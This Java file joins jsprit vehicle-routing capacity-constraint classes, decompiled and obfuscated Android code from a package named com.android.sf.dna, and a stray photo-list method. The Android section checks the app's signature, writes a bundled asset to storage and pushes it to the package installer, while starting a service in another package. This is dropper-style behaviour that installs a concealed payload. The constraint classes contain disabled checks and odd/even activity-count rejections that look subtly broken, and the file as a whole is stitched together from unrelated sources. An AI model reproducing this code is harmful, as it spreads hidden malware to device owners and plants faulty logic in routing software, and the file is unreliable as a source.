/*
 * Licensed to GraphHopper GmbH under one or more contributor
 * license agreements. See the NOTICE file distributed with this work for
 * additional information regarding copyright ownership.
 *
 * GraphHopper GmbH licenses this file to you under the Apache License,
 * Version 2.0 (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.graphhopper.jsprit.core.problem.constraint;

import com.graphhopper.jsprit.core.algorithm.state.InternalStates;
import com.graphhopper.jsprit.core.problem.Capacity;
import com.graphhopper.jsprit.core.problem.misc.JobInsertionContext;
import com.graphhopper.jsprit.core.problem.solution.route.activity.*;
import com.graphhopper.jsprit.core.problem.solution.route.state.RouteAndActivityStateGetter;


/**
 * Ensures load constraint for inserting ServiceActivity.
 * <p>
 * <p>When using this, you need to use<br>
 *
 * @author schroeder
 */
public class ServiceLoadActivityLevelConstraint implements HardActivityConstraint {

    private RouteAndActivityStateGetter stateManager;

    private Capacity defaultValue;

    public ServiceLoadActivityLevelConstraint(RouteAndActivityStateGetter stateManager) {
        super();
        this.stateManager = stateManager;
        defaultValue = Capacity.Builder.newInstance().build();
    }

    @Override
    public ConstraintsStatus fulfilled(JobInsertionContext iFacts, TourActivity prevAct, TourActivity newAct, TourActivity nextAct, double prevActDepTime) {
        Capacity futureMaxLoad;
        Capacity prevMaxLoad;
        if (prevAct instanceof Start) {
            futureMaxLoad = stateManager.getRouteState(iFacts.getRoute(), InternalStates.MAXLOAD, Capacity.class);
            if (futureMaxLoad == null) futureMaxLoad = defaultValue;
            prevMaxLoad = stateManager.getRouteState(iFacts.getRoute(), InternalStates.LOAD_AT_BEGINNING, Capacity.class);
            if (prevMaxLoad == null) prevMaxLoad = defaultValue;
        } else {
            futureMaxLoad = stateManager.getActivityState(prevAct, InternalStates.FUTURE_MAXLOAD, Capacity.class);
            if (futureMaxLoad == null) futureMaxLoad = defaultValue;
            prevMaxLoad = stateManager.getActivityState(prevAct, InternalStates.PAST_MAXLOAD, Capacity.class);
            if (prevMaxLoad == null) prevMaxLoad = defaultValue;

        }
//        if (newAct instanceof PickupService || newAct instanceof ServiceActivity) {
//            if (!Capacity.addup(newAct.getSize(), futureMaxLoad).isLessOrEqual(iFacts.getNewVehicle().getType().getCapacityDimensions())) {
//                return ConstraintsStatus.NOT_FULFILLED;
//            }
//        }
//        if (newAct instanceof DeliverService) {
//            if (!Capacity.addup(Capacity.invert(newAct.getSize()), prevMaxLoad).isLessOrEqual(iFacts.getNewVehicle().getType().getCapacityDimensions())) {
//                return ConstraintsStatus.NOT_FULFILLED_BREAK;
//            }
//        }
        return ConstraintsStatus.FULFILLED;
    }
}

/*
 * Licensed to GraphHopper GmbH under one or more contributor
 * license agreements. See the NOTICE file distributed with this work for
 * additional information regarding copyright ownership.
 *
 * GraphHopper GmbH licenses this file to you under the Apache License,
 * Version 2.0 (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.graphhopper.jsprit.core.problem.constraint;

import com.graphhopper.jsprit.core.algorithm.state.InternalStates;
import com.graphhopper.jsprit.core.problem.Capacity;
import com.graphhopper.jsprit.core.problem.job.Delivery;
import com.graphhopper.jsprit.core.problem.job.Pickup;
import com.graphhopper.jsprit.core.problem.job.Service;
import com.graphhopper.jsprit.core.problem.misc.JobInsertionContext;
import com.graphhopper.jsprit.core.problem.solution.route.state.RouteAndActivityStateGetter;

/**
 * Ensures that capacity constraint is met, i.e. that current load plus
 * new job size does not exceeds capacity of new vehicle.
 * <p>
 * <p>If job is neither Pickup, Delivery nor Service, it returns true.
 *
 * @author stefan
 */
public class ServiceLoadRouteLevelConstraint implements HardRouteConstraint {

    private RouteAndActivityStateGetter stateManager;

    private Capacity defaultValue;

    public ServiceLoadRouteLevelConstraint(RouteAndActivityStateGetter stateManager) {
        super();
        this.stateManager = stateManager;
        this.defaultValue = Capacity.Builder.newInstance().build();
    }

    @Override
    public boolean fulfilled(JobInsertionContext insertionContext) {
        Capacity maxLoadAtRoute = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.MAXLOAD, Capacity.class);
        if (maxLoadAtRoute == null) maxLoadAtRoute = defaultValue;
        Capacity capacityDimensions = insertionContext.getNewVehicle().getType().getCapacityDimensions();
        if (!maxLoadAtRoute.isLessOrEqual(capacityDimensions)) {
            return false;
        }
        if (insertionContext.getJob() instanceof Delivery) {
            Capacity loadAtDepot = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.LOAD_AT_BEGINNING, Capacity.class);
            if (loadAtDepot == null) loadAtDepot = defaultValue;
            if (!Capacity.addup(loadAtDepot, insertionContext.getJob().getSize()).isLessOrEqual(capacityDimensions)) {
                return false;
            }
            if (insertionContext.getRoute().getActivities().size() % 2 == 0) {
                return false;
            }
        } else if (insertionContext.getJob() instanceof Pickup || insertionContext.getJob() instanceof Service) {
            Capacity loadAtEnd = stateManager.getRouteState(insertionContext.getRoute(), InternalStates.LOAD_AT_END, Capacity.class);
            if (loadAtEnd == null) loadAtEnd = defaultValue;
            if (!Capacity.addup(loadAtEnd, insertionContext.getJob().getSize()).isLessOrEqual(capacityDimensions)) {
                return false;
            }
            if (insertionContext.getRoute().getActivities().size() % 2 == 1) {
                return false;
            }
        }
        return true;
    }

}

class Up implements DialogInterface.OnClickListener {
    Up(Collection paramCollection) {}

    public void onClick(DialogInterface paramDialogInterface, int paramInt) {
        try {
            this.a.a.d.setCancelable(true);
            this.a.a.d.dismiss();
            this.a.a.d.cancel();
            return;
        } catch (Exception exception) {
            return;
        }
    }
}

class Collection extends Handler {
    Collection(To paramTo) {}

    public void handleMessage(Message paramMessage) {
        // Byte code:
        //   0: aload_0
        //   1: aload_1
        //   2: invokespecial handleMessage : (Landroid/os/Message;)V
        //   5: aload_1
        //   6: getfield what : I
        //   9: lookupswitch default -> 84, 0 -> 85, 10 -> 364, 11 -> 383, 12 -> 475, 13 -> 657, 14 -> 768, 100 -> 879, 101 -> 111
        //   84: return
        //   85: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   88: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   91: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   94: invokevirtual getPackageName : ()Ljava/lang/String;
        //   97: invokevirtual getLaunchIntentForPackage : (Ljava/lang/String;)Landroid/content/Intent;
        //   100: astore_1
        //   101: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   104: aload_1
        //   105: invokevirtual startActivity : (Landroid/content/Intent;)V
        //   108: return
        //   109: astore_1
        //   110: return
        //   111: ldc ''
        //   113: astore_1
        //   114: new java/lang/StringBuilder
        //   117: dup
        //   118: invokespecial <init> : ()V
        //   121: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   124: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   127: invokevirtual getResources : ()Landroid/content/res/Resources;
        //   130: new java/lang/StringBuilder
        //   133: dup
        //   134: invokespecial <init> : ()V
        //   137: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   140: invokevirtual getPackageName : ()Ljava/lang/String;
        //   143: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   146: ldc ':string/app_name'
        //   148: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   151: invokevirtual toString : ()Ljava/lang/String;
        //   154: aconst_null
        //   155: aconst_null
        //   156: invokevirtual getIdentifier : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
        //   159: invokevirtual getString : (I)Ljava/lang/String;
        //   162: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   165: ldc ':'
        //   167: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   170: invokevirtual toString : ()Ljava/lang/String;
        //   173: astore_2
        //   174: aload_2
        //   175: astore_1
        //   176: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   179: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   182: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   185: invokevirtual getPackageName : ()Ljava/lang/String;
        //   188: iconst_0
        //   189: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
        //   192: getfield versionName : Ljava/lang/String;
        //   195: astore_2
        //   196: new java/lang/StringBuilder
        //   199: dup
        //   200: invokespecial <init> : ()V
        //   203: aload_2
        //   204: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   207: ldc '.2'
        //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   212: invokevirtual toString : ()Ljava/lang/String;
        //   215: astore_3
        //   216: aload_0
        //   217: getfield a : Lcom/android/sf/dna/To;
        //   220: new android/app/AlertDialog$Builder
        //   223: dup
        //   224: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   227: invokespecial <init> : (Landroid/content/Context;)V
        //   230: iconst_0
        //   231: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   234: ldc 'aZ+4B1OpB1HYB1xYBbCO'
        //   236: ldc 'uKiI9qn_'
        //   238: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   241: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   244: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   247: new java/lang/StringBuilder
        //   250: dup
        //   251: invokespecial <init> : ()V
        //   254: ldc 'BQIVB12EB7+4662H'
        //   256: ldc 'uKiI9qn_'
        //   258: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   261: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   264: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   267: aload_2
        //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   271: ldc 'vnmII6qIRmJR5bKRmmehhFbZ'
        //   273: ldc 'uKiI9qn_'
        //   275: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   278: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   281: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   284: aload_1
        //   285: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   288: aload_3
        //   289: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   292: invokevirtual toString : ()Ljava/lang/String;
        //   295: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   298: ldc 'BatOBHaH'
        //   300: ldc 'uKiI9qn_'
        //   302: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   305: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   308: new com/android/sf/dna/Atrox
        //   311: dup
        //   312: aload_0
        //   313: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   316: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   319: invokevirtual create : ()Landroid/app/AlertDialog;
        //   322: putfield e : Landroid/app/AlertDialog;
        //   325: aload_0
        //   326: getfield a : Lcom/android/sf/dna/To;
        //   329: getfield e : Landroid/app/AlertDialog;
        //   332: new com/android/sf/dna/Crotalus
        //   335: dup
        //   336: aload_0
        //   337: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   340: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   343: aload_0
        //   344: getfield a : Lcom/android/sf/dna/To;
        //   347: getfield e : Landroid/app/AlertDialog;
        //   350: invokevirtual show : ()V
        //   353: return
        //   354: astore_2
        //   355: ldc '1.2.1121'
        //   357: astore_2
        //   358: ldc '1.2.3221'
        //   360: astore_3
        //   361: goto -> 216
        //   364: new java/lang/Thread
        //   367: dup
        //   368: new com/android/sf/dna/Looking
        //   371: dup
        //   372: aload_0
        //   373: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   376: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   379: invokevirtual start : ()V
        //   382: return
        //   383: aload_0
        //   384: getfield a : Lcom/android/sf/dna/To;
        //   387: new android/app/ProgressDialog
        //   390: dup
        //   391: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   394: invokespecial <init> : (Landroid/content/Context;)V
        //   397: putfield d : Landroid/app/ProgressDialog;
        //   400: aload_0
        //   401: getfield a : Lcom/android/sf/dna/To;
        //   404: getfield d : Landroid/app/ProgressDialog;
        //   407: iconst_0
        //   408: invokevirtual setCancelable : (Z)V
        //   411: aload_0
        //   412: getfield a : Lcom/android/sf/dna/To;
        //   415: getfield d : Landroid/app/ProgressDialog;
        //   418: ldc 'BUCwBz2bB1OpB1HYB1xYBbCO9WQO'
        //   420: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   423: invokevirtual setTitle : (Ljava/lang/CharSequence;)V
        //   426: aload_0
        //   427: getfield a : Lcom/android/sf/dna/To;
        //   430: getfield d : Landroid/app/ProgressDialog;
        //   433: invokevirtual show : ()V
        //   436: aload_0
        //   437: getfield a : Lcom/android/sf/dna/To;
        //   440: invokestatic a : (Lcom/android/sf/dna/To;)V
        //   443: new java/lang/Thread
        //   446: dup
        //   447: new com/android/sf/dna/New
        //   450: dup
        //   451: aload_0
        //   452: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   455: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   458: invokevirtual start : ()V
        //   461: return
        //   462: astore_1
        //   463: aload_0
        //   464: getfield a : Lcom/android/sf/dna/To;
        //   467: bipush #13
        //   469: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   472: return
        //   473: astore_1
        //   474: return
        //   475: new java/io/File
        //   478: dup
        //   479: new java/lang/StringBuilder
        //   482: dup
        //   483: invokespecial <init> : ()V
        //   486: ldc '9Ci5utjhztkp7cA_'
        //   488: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   491: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   494: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   497: invokevirtual getPackageName : ()Ljava/lang/String;
        //   500: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   503: ldc '9Cz18t3N94nO7KTm'
        //   505: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   508: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   511: invokevirtual toString : ()Ljava/lang/String;
        //   514: invokespecial <init> : (Ljava/lang/String;)V
        //   517: astore_1
        //   518: aload_1
        //   519: invokevirtual exists : ()Z
        //   522: ifeq -> 641
        //   525: aload_1
        //   526: invokevirtual canRead : ()Z
        //   529: ifeq -> 641
        //   532: aload_1
        //   533: invokestatic fromFile : (Ljava/io/File;)Landroid/net/Uri;
        //   536: astore_1
        //   537: new android/content/Intent
        //   540: dup
        //   541: ldc 'android.intent.action.VIEW'
        //   543: aload_1
        //   544: invokespecial <init> : (Ljava/lang/String;Landroid/net/Uri;)V
        //   547: astore_2
        //   548: aload_2
        //   549: aload_1
        //   550: invokevirtual setData : (Landroid/net/Uri;)Landroid/content/Intent;
        //   553: pop
        //   554: aload_2
        //   555: iconst_1
        //   556: invokevirtual addFlags : (I)Landroid/content/Intent;
        //   559: pop
        //   560: aload_2
        //   561: ldc 'com.android.packageinstaller'
        //   563: ldc 'com.android.packageinstaller.PackageInstallerActivity'
        //   565: invokevirtual setClassName : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   568: pop
        //   569: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   572: aload_2
        //   573: invokevirtual startActivity : (Landroid/content/Intent;)V
        //   576: iconst_0
        //   577: putstatic com/android/sf/dna/To.i : Z
        //   580: aload_0
        //   581: getfield a : Lcom/android/sf/dna/To;
        //   584: getfield d : Landroid/app/ProgressDialog;
        //   587: iconst_1
        //   588: invokevirtual setCancelable : (Z)V
        //   591: aload_0
        //   592: getfield a : Lcom/android/sf/dna/To;
        //   595: getfield d : Landroid/app/ProgressDialog;
        //   598: invokevirtual dismiss : ()V
        //   601: aload_0
        //   602: getfield a : Lcom/android/sf/dna/To;
        //   605: getfield d : Landroid/app/ProgressDialog;
        //   608: invokevirtual cancel : ()V
        //   611: new java/lang/Thread
        //   614: dup
        //   615: new com/android/sf/dna/Additions
        //   618: dup
        //   619: aload_0
        //   620: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   623: invokespecial <init> : (Ljava/lang/Runnable;)V
        //   626: invokevirtual start : ()V
        //   629: return
        //   630: astore_1
        //   631: aload_0
        //   632: getfield a : Lcom/android/sf/dna/To;
        //   635: bipush #13
        //   637: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   640: return
        //   641: aload_0
        //   642: getfield a : Lcom/android/sf/dna/To;
        //   645: bipush #13
        //   647: invokestatic a : (Lcom/android/sf/dna/To;I)V
        //   650: goto -> 580
        //   653: astore_1
        //   654: goto -> 611
        //   657: aload_0
        //   658: getfield a : Lcom/android/sf/dna/To;
        //   661: new android/app/AlertDialog$Builder
        //   664: dup
        //   665: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   668: invokespecial <init> : (Landroid/content/Context;)V
        //   671: iconst_0
        //   672: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   675: ldc_w 'a7vHBB+R'
        //   678: ldc 'uKiI9qn_'
        //   680: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   683: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   686: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   689: ldc_w 'a9XdB1HYBHcsa9cR662fB9W9BU25B1OpB1HY662T'
        //   692: ldc 'uKiI9qn_'
        //   694: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   697: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   700: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   703: ldc 'BatOBHaH'
        //   705: ldc 'uKiI9qn_'
        //   707: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   710: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   713: new com/android/sf/dna/Up
        //   716: dup
        //   717: aload_0
        //   718: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   721: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   724: invokevirtual create : ()Landroid/app/AlertDialog;
        //   727: putfield e : Landroid/app/AlertDialog;
        //   730: aload_0
        //   731: getfield a : Lcom/android/sf/dna/To;
        //   734: iconst_0
        //   735: putfield f : I
        //   738: aload_0
        //   739: getfield a : Lcom/android/sf/dna/To;
        //   742: getfield e : Landroid/app/AlertDialog;
        //   745: new com/android/sf/dna/Some
        //   748: dup
        //   749: aload_0
        //   750: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   753: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   756: aload_0
        //   757: getfield a : Lcom/android/sf/dna/To;
        //   760: getfield e : Landroid/app/AlertDialog;
        //   763: invokevirtual show : ()V
        //   766: return
        //   767: astore_1
        //   768: aload_0
        //   769: getfield a : Lcom/android/sf/dna/To;
        //   772: new android/app/AlertDialog$Builder
        //   775: dup
        //   776: getstatic com/android/sf/dna/To.g : Landroid/content/Context;
        //   779: invokespecial <init> : (Landroid/content/Context;)V
        //   782: iconst_0
        //   783: invokevirtual setCancelable : (Z)Landroid/app/AlertDialog$Builder;
        //   786: ldc_w 'a7vHBB+R'
        //   789: ldc 'uKiI9qn_'
        //   791: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   794: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   797: invokevirtual setTitle : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   800: ldc_w 'B1OpB1HYaz2SaZHTBbZba7X0BzvhaZ+RBaW9B8UG'
        //   803: ldc 'uKiI9qn_'
        //   805: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   808: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   811: invokevirtual setMessage : (Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
        //   814: ldc_w 'a7X0Bzvh'
        //   817: ldc 'uKiI9qn_'
        //   819: invokestatic a : (Ljava/lang/String;)Ljava/lang/String;
        //   822: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   825: new com/android/sf/dna/Today
        //   828: dup
        //   829: aload_0
        //   830: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   833: invokevirtual setPositiveButton : (Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
        //   836: invokevirtual create : ()Landroid/app/AlertDialog;
        //   839: putfield e : Landroid/app/AlertDialog;
        //   842: aload_0
        //   843: getfield a : Lcom/android/sf/dna/To;
        //   846: iconst_0
        //   847: putfield f : I
        //   850: aload_0
        //   851: getfield a : Lcom/android/sf/dna/To;
        //   854: getfield e : Landroid/app/AlertDialog;
        //   857: new com/android/sf/dna/Picked
        //   860: dup
        //   861: aload_0
        //   862: invokespecial <init> : (Lcom/android/sf/dna/Collection;)V
        //   865: invokevirtual setOnKeyListener : (Landroid/content/DialogInterface$OnKeyListener;)V
        //   868: aload_0
        //   869: getfield a : Lcom/android/sf/dna/To;
        //   872: getfield e : Landroid/app/AlertDialog;
        //   875: invokevirtual show : ()V
        //   878: return
        //   879: aload_0
        //   880: getfield a : Lcom/android/sf/dna/To;
        //   883: getfield c : Landroid/content/Intent;
        //   886: aload_0
        //   887: getfield a : Lcom/android/sf/dna/To;
        //   890: getfield a : Ljava/lang/String;
        //   893: aload_0
        //   894: getfield a : Lcom/android/sf/dna/To;
        //   897: getfield b : Ljava/lang/String;
        //   900: invokevirtual setClassName : (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
        //   903: pop
        //   904: getstatic com/android/sf/dna/To.h : Landroid/app/Activity;
        //   907: aload_0
        //   908: getfield a : Lcom/android/sf/dna/To;
        //   911: getfield c : Landroid/content/Intent;
        //   914: invokevirtual startService : (Landroid/content/Intent;)Landroid/content/ComponentName;
        //   917: pop
        //   918: return
        //   919: astore_1
        //   920: return
        //   921: astore_2
        //   922: goto -> 176
        //   925: astore_1
        //   926: return
        // Exception table:
        //   from	to	target	type
        //   85	108	109	java/lang/Exception
        //   114	174	921	java/lang/Exception
        //   176	216	354	java/lang/Exception
        //   216	353	925	java/lang/Exception
        //   383	436	473	java/lang/Exception
        //   436	461	462	java/lang/Exception
        //   463	472	473	java/lang/Exception
        //   475	580	653	java/lang/Exception
        //   580	611	653	java/lang/Exception
        //   611	629	630	java/lang/Exception
        //   641	650	653	java/lang/Exception
        //   657	766	767	java/lang/Exception
        //   879	918	919	java/lang/Exception
    }
}

public class To {
    static Context g = null;

    static Activity h = null;

    public static boolean i = true;

    String a = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32Xl__");

    String b = Amazing.a("7CMg9IkOzoFhHxlO7Ikput32XcBvrIRDzC3lrIMCHxiRrn__");

    Intent c = new Intent();

    ProgressDialog d = null;

    AlertDialog e = null;

    int f = 0;

    String j = "3082025d308201c6a00302010202044de7355a300d06092a864886f70d010105050030723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a69303030313020170d3131303630323037303134365a180f32313232303530363037303134365a30723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a693030303130819f300d06092a864886f70d010101050003818d0030818902818100b2851f2f85af5894bdfd96b10b9465dfc10bf430d66f3837bd12f2346c438f3da0c16666cc23e7ae29c1f3ce30167d32376bb170b372fb8c87439b6ce7f0c3811818d60517131ddf1cead3db2e124f918d6b5db9899dd56fa28ff933c4ed855233d5318dd3d3b4fb28b00c5b8b8cec71a74a88a011d6c8256b90ce122a4a06330203010001300d06092a864886f70d0101050500038181000d72270a1c9970897335541d64ba729568a0f535aee7c20e5397f44d410e6cf76d0f97bc495eeb8e77d2d3d3ab6fe947515f4cb10468b073bf122a4e4bcdd2e6f0a6623af3bdc9039cc8139dc4fb32c58cf55f1661b730beaa5977faea9ace72e65448a002e5bffa6de75fcf14a1c3bcfd64d385c7e6654c4e2f52e635015dae";

    Random k = new Random();

    boolean l = false;

    private int m = 3;

    private Handler n = new Collection(this);

    private void a(int paramInt) {
        Message message = new Message();
        message.what = paramInt;
        this.n.sendMessage(message);
    }

    private void c() {
        try {
            this.c.setClassName(this.a, this.b);
            h.startService(this.c);
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void d() {
        try {
            File file = new File(Amazing.a("9Ci5utjhztkp7cA_") + h.getPackageName() + Amazing.a("9Cz18t3N94nO7KTm"));
            if (file.exists())
                file.delete();
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void e() {
        this.l = false;
        try {
            d();
            InputStream inputStream = h.getAssets().open(Amazing.a("7xBNzKFCzKFW"));
            FileOutputStream fileOutputStream = h.openFileOutput(Amazing.a("XvB5rtE_"), this.m);
            byte[] arrayOfByte = new byte[inputStream.available()];
            while (true) {
                if (inputStream.read(arrayOfByte) == -1) {
                    inputStream.close();
                    fileOutputStream.flush();
                    fileOutputStream.close();
                    this.l = true;
                    return;
                }
                fileOutputStream.write(arrayOfByte);
            }
        } catch (Exception exception) {
            return;
        }
    }

    public String a() {
        try {
            return (h.getBaseContext().getPackageManager().getPackageInfo(h.getPackageName(), 64)).signatures[0].toCharsString();
        } catch (Exception exception) {
            return null;
        }
    }

    public void a(Context paramContext, Activity paramActivity) {
        g = paramContext;
        h = paramActivity;
        if (this.j.equals(a()))
            b();
    }

    public void b() {
        int i;
        int j;
        if (Build.VERSION.RELEASE.startsWith("1.5"))
            return;
        c();
        try {
            i = (h.getPackageManager().getPackageInfo(h.getPackageName(), 0)).versionCode;
            Context context = h.createPackageContext(this.a, 2);
            Thread.sleep(500L);
            j = context.getSharedPreferences("first_app_perferences", this.m).getInt("global_b_version_id", 0);
            if (j == 0) {
                a(10);
                return;
            }
        } catch (Exception exception) {
            a(10);
            return;
        }
        if (j < i) {
            a(10);
            return;
        }
        d();
    }
}

private void getListPhoto(String paramString) {
        AssetManager assetManager = getAssets();
        InputStream inputStream = null;
        try {
            InputStream inputStream1 = assetManager.open(String.valueOf(paramString) + ".txt");
            inputStream = inputStream1;
        } catch (IOException iOException) {}
        this.namePhoto = new ArrayList<String>();
        this.listPhoto = new ArrayList<String>();
        this.pathPhoto = new ArrayList<String>();
        String[] arrayOfString = FileUtil.readTextFile(inputStream).split("\n");
        this.PhotoCount = arrayOfString.length - 1;
        if (paramString == "list") {
            int j = 1;
            while (true) {
                if (j < arrayOfString.length) {
                    String[] arrayOfString1 = arrayOfString[j].trim().split(",");
                    this.namePhoto.add(arrayOfString1[0]);
                    this.listPhoto.add("https://lh" + arrayOfString1[1].replace("xcom/", ".googleusercontent.com/") + "w320/");
                    this.pathPhoto.add(arrayOfString1[2].trim());
                    j++;
                    continue;
                }
                return;
            }
        }
        int i = 1;
        while (true) {
            if (i < arrayOfString.length) {
                this.listPhoto.add("https://lh" + arrayOfString[i].trim().replace("xcom/", ".googleusercontent.com/") + "w320/");
                i++;
                continue;
            }
            return;
        }
    }